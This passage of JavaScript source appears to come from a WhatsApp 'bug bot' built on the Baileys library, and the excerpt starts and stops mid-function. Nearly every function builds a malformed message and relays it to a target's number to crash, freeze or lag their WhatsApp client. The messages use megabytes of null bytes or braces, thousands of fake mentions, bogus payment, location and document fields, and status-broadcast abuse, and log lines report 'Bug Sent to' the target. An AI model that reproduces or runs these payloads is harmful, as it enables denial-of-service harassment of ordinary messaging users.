   for (let i = 0; i < 1755; i++) { 
      const msg = await generateWAMessageFromContent(target, {
         extendedTextMessage: {
            text: "" + "\0".repeat(90000),
            contextInfo: {
               mentionedJid: [target],
               isForwarded: true,
               forwardingScore: 99999,                
               stanzaId: target,
               participant: "0@s.whatsapp.net",
               remoteJid: target,
               conversionSource: "source_example",
               conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
               conversionDelaySeconds: 10,
               quotedAd: {
                  advertiserName: " x ",
                  mediaType: "IMAGE",          
                  jpegThumbnail: Buffer.alloc(0),
                  caption: " x "
               },
               placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
               },
            },
         },
      }, { 
         userJid: target,
         quoted: typeof fonkep !== 'undefined' ? fonkep : null 
      });

      await sock.relayMessage(target, msg.message, {
         messageId: msg.key.id,
         participant: { jid: target }
      });
   }
}
async function R9X(sock, target, mention = false) {
  await sock.relayMessage(
    target,
    {
     interactiveMessage: {
       body: { text: "R9X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_info",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4TWOZ803CWN\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"payment_key\",\"payment_key\":{\"type\":\"IDPAYMENTACCOUNT\",\"key\":\"" + `${".".repeat(30000)}` + "\",\"name\":\"OVO\",\"institution_name\":\"OVO\",\"full_name_on_account\":\"R9X \",\"account_type\":\"wallet\"}}],\"share_payment_status\":false,\"referral\":\"chat_attachment\"}"
            }
          ]
        }
      }
    },
    mention
      ? {
          participant: { jid: target }
        }
      : {}
  );
}
async function DileyInvisi(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
     message: {
      header: {
        locationMessage: {
           degreesLatitude: -1,
           degreesLongitude: -11,
           name: "AreoLockedYou ?!!",
           url: "https://mmg.net/" + "\n".repeat(20000)
          }
       },
       interactiveResponseMessage: {
         body: { text: "I'M coming" + "\u0000".repeat(500) },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000) + "{[".repeat(10300) + "source: app",
              version: 3
                }
              }
            }
          }
        }, { 
          statusJidList: [target],
           additionalNodes: [{
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [{ tag: "mentioned_users", attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }] }] }] });
          }
async function focusedimfocused(sock, target) {
await sock.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `confident - flatline\n https://t.me/imkelrax\n`,
contextInfo: {
mentionedJid: [
"6285215587498@s.whatsapp.net",
...Array.from({
length: 4000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
}
}
}, {
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
}
);

const msg = {
  groupStatusMessageV2: {
    message: {
      interactiveResponseMessage: {
        body: {
          text: "",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "{\"flow_cta\":\"" + "\x00".repeat(19600) + "\"}}",
          version: 3
        }
      }
    }
  }
}

await sock.relayMessage(target, msg, { 
  participant: { jid: target }
});
}
async function Nyawit(sock, target) {
  try {
    await sock.sendMessage(target, { text: "NYAWIT DULU BANGKUH" });
    for (let k = 0; k < 200; k++) {
      const Msg = {
       groupStatusMessageV2: {
        message: {
         interactiveResponseMessage: {
              body: {
                text: "\u0000".repeat(999999), 
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "cta_Nyawit",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}}`,
                version: 3
              }
            }
          }
        }
      };

      await sock.relayMessage(target, Msg, {
        participant: { jid: target },
        userJid: target,
        messageId: null
      });
    }

    console.log("Done");
  } catch (error) {
    console.error("Error:", error);
  }
}
async function VnXDelayXBulldoNew(sock, target) {
 await sock.relayMessage(target, {
   groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          header: {
            listMessage: {
              title: "\u0000".repeat(350000),
              description: "\u0000".repeat(250000),
              buttonText: "VnX",
              footerText: "",
              listType: 1,
            sections: [
           {
            title: "",
              rows: Array.from({ length: 10 }, (_, i) => ({
              title: `\u0000`.repeat(250000),
              description: `\u0000`.repeat(250000),
              rowId: null
              }))
            }
          ],
          body: {
            text: "\u0000.VnX".repeat(999909),
            title: "\u0000.VnX".repeat(999909)
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(400000),
            version: 3
            }
          }
        }
      }
    }
  }
}, { participant: { jid: target } });

  console.log("[!] VnX Bug Sent to: " + target);
}
async function VnXFcCodeMetaNew(sock, target) {
  try {
    const subcontent = [
      {
        messageType: 5,
        codeMetadata: {
          codeLanguage: "json",
          codeBlocks: [
            {
              highlightType: 0,
              codeContent: "{\n"
            },
            {
              highlightType: 3,
              codeContent: '  "name": "payment_method"\n'
            },
            {
              highlightType: 0,
              codeContent: "}"
            }
          ]
        }
      },
      {
        messageType: 3,
        imageMetadata: {
          imageUrl: {
            imagePreviewUrl: ".jpg",
            imageHighResUrl: ".jpg",
            sourceUrl: ".jpg"
          },
          imageText: "@Raffioffci5 VnX",
          alignment: 2,
          tapLinkUrl: "https://t.me/ZaidanCh"
        }
      }
    ];

    const VnXMsg = {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: subcontent,
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
              forwardOrigin: 4
            }
          }
        }
      }
    };

   const VnXReal = {
    groupStatusMessageV2: {
      message: {
       stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=", 
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=", 
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724",
        stickerSentTs: "1775044724091",
       }
     }
   }
 };


    await sock.relayMessage(target, VnXMsg, { participant: { jid: target } });
    await sock.relayMessage(target, VnXReal, { participant: { jid: target } });

    console.log(`VnX Sent Successfully to ${target}`);

  } catch (e) {
    console.log("❌ Error Bng Funcnya, Tanya Ke Dep VnX Nya Biar Di Benerin:", e.message || e);
  }
}
//new func
async function ZenoCrashNoClick(sock, target) {
  const ButtonsPush = [
    {
      name: "single_select",
      buttonParamsJson: JSON.stringify({  
        title: "ꦽ".repeat(5000),
        sections: [
          {
            title: "\u0000",
            rows: [],
          },
        ],
      }),
    },
  ];
  
  for (let i = 0; i < 10; i++) {
    ButtonsPush.push(
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(5000),
        })
      },
      {
        name: "mpm",
        buttonParamsJson: JSON.stringify({
          status: true
        })
      },
      {
        name: "cta_call",
        buttonParamsJson: JSON.stringify({
          status: true
        })
      },
    );
  }
  
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ោ៝".repeat(20000),
              locationMessage: {
                degreesLatitude: 0,
                degreesLongtitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "𝗫 - 𝗭 𝗘 𝗡 𝗢" +
                "ꦽ".repeat(25000) +
                "ោ៝".repeat(20000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: ButtonsPush,
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "131338822@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              remoteJid: "X",
              participant: target,
              stanzaId: "1234567890ABCDEF",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
              },
            },
          },
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function BetaExploit(sock, target) {
    try {
    await sock.presenceSubscribe(target);
    await sock.sendPresenceUpdate('composing', target);
    await new Promise(resolve => setTimeout(resolve, 1500)); 
    const mentions1 = Array.from({ length: 1900 }, () => 
            "1" + Math.floor(Math.random() * 900000000) + "@s.whatsapp.net"
        );
        const extendedMsg = {
            extendedTextMessage: {
                text: "mexxtzzy ¿?",
                locationMessage: {
                    degressLatitude: 617267,
                    degressLongitude: -6172677,
                    isLive: true,
                    accuracyInMetters: 100,
                    jpegThumbnail: null,
                },
                contextInfo: {
                    forwardingScore: 9471,
                    isForwarded: true,
                    mentionedJid: mentions1,
                    participant: target,
                    stanzaId: target,
                    remoteJid: target,
                },
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3,
                },
            },
        };
        const paymentPayload = {
            interactiveMessage: {
                body: { text: "X" },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "payment_key_info",
                            buttonParamsJson: "{}"
                        },
                        {
                            name: "payment_system",
                            buttonParamsJson: "{}"
                        }
                    ]
                }
            }
        };
        const heavyPayload = {
            interactiveResponseMessage: {
                body: {
                    text: "\u0000".repeat(200),
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: JSON.stringify({
                        values: {
                            in_pin_code: "999999",
                            building_name: "saosinx",
                            landmark_area: "X",
                            address: "Mxc",
                            tower_number: "Mxc",
                            city: "chindo",
                            name: "Cy4",
                            phone_number: "999999999999",
                            house_number: "xxx",
                            floor_number: "xxx",
                            state: `D | ${"\u0000".repeat(900000)}`
                        },
                        version: 3
                    }),
                },
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        }
                    }
                }, 
            }
        };
        await sock.relayMessage(target, { groupStatusMessageV2: { message: extendedMsg } }, { participant: { jid: target } });
        await sock.relayMessage(target, { groupStatusMessageV2: { message: paymentPayload } }, { participant: { jid: target } });
        await sock.relayMessage(target, { groupStatusMessageV2: { message: heavyPayload } }, { participant: { jid: target } });

    } catch (err) {
        console.log(err);
    }
}

// New Func Fc Kunyuk
async function combo3(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'STRAVAS🔥',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "STRAVAS🔥"
                },
                footer: {
                  text: "nika.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ nika.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("Bug")} to ${target}`))
}
async function combo2(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'STRAVAS🔥',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "STRAVAS🔥"
                },
                footer: {
                  text: "nika.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
}
    //Bulldozersv2
async function bulldozerV2(sock, target) {
  const stickerPayload = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
      fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
      fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
      mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
      mimetype: "image/webp",
      directPath: "/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
      fileLength: { low: 99999999, high: 0, unsigned: true },
      mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
      firstFrameLength: 50000,
      firstFrameSidecar: "QmFkUmVhZHlUT1JFQ1Q=",
      isAnimated: true,
      isAvatar: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: Array.from({ length: 60000 }, () =>
          "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
        ),
        forwardingScore: 999999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u200E".repeat(40000),
          body: "\u200E".repeat(40000),
          mediaUrl: "",
          mediaType: 1,
          thumbnail: Buffer.from([]),
          sourceUrl: "",
          renderLargerThumbnail: true
        }
      }
    }
  };

  const templatePayload = {
    templateMessage: {
      hydratedTemplate: {
        hydratedContentText: "\u200E".repeat(90000),
        hydratedFooterText: "Oblivion Force Activated",
        hydratedButtons: [],
        templateId: "oblivion_" + Date.now(),
        contextInfo: {
          quotedMessage: stickerPayload,
          forwardingScore: 88888,
          isForwarded: true
        }
      }
    }
  };

  const wrap = {
    viewOnceMessage: {
      message: templatePayload
    }
  };

  const msg = generateWAMessageFromContent(target, wrap, {
    quoted: null,
    messageId: "oblv_" + Date.now()
  });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
//Fc 
async function StravasFC(sock, target) {
for (let r = 0; r < 1; r++) {
try {
let msg = await generateWAMessageFromContent(
  target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          header: {
            title: "",
              hasMediaAttachment: false,
              locationMessage: {
              degreesLatitude: 1e309,
              degreesLongitude: -1e309,
              name: '{'.repeat(50000),
              address: '{'.repeat(50000),
              },
            },
           contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [" 0@s.whatsapp.net"]
          },
            body: {
              text: "Nika.js",
            },
            nativeFlowMessage: {
              messageParamsJson: '{'.repeat(50000),
            },
          },
        },
      },
    },
    {}
  );
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
} catch (err) {
console.log("Error Sending Bug", err);
}
console.log("Stravas Menyerang Target 🤭 ")
}
}
async function DocFC(sock, target) {
  for (let r = 0; r < 1; r++) {
    try {
      let msg = await generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "Stravas Anjay",
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 999999999,
                    degreesLongitude: -999999999,
                    name: '{'.repeat(100000),
                    address: '{'.repeat(100000),
                  },
                },
                contextInfo: {
                  participant: "0@s.whatsapp.net",
                  remoteJid: "X",
                  mentionedJid: ["0@s.whatsapp.net"]
                },
                body: {
                  text: "Nika.js",
                },
                nativeFlowMessage: {
                  messageParamsJson: '{'.repeat(100000),
                },
              },
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                fileSha256: Buffer.from("ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=", "base64"),
                fileLength: "974197419741",
                pageCount: "974197419741",
                mediaKey: Buffer.from("5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", "base64"),
                fileName: "𝄽̸̷̷̸̛̽͢͟͠͞͡͏́͢͟͡".repeat(70),
                fileEncSha256: Buffer.from("pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=", "base64"),
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173"
              }
            }
          }
        },
        {}
      );
      await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
    } catch (err) {
      console.log("Error Sending Bug:", err);
    }
    console.log("Succesfuly Sending Bug");
  }
}
async function PrePortDoc(sock, target) {
  try {
    let message = proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Dit? Yess sir",
              hasMediaAttachment: false,
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                mimetype: "penis",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "99999999",
                pageCount: 9999,
                 mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
              },
            },
            body: {
              text: "ХᏟՏᏢᎽᎬХϴᏃᎬͲ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 50000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    });

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function invisSqL(sock, isTarget) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
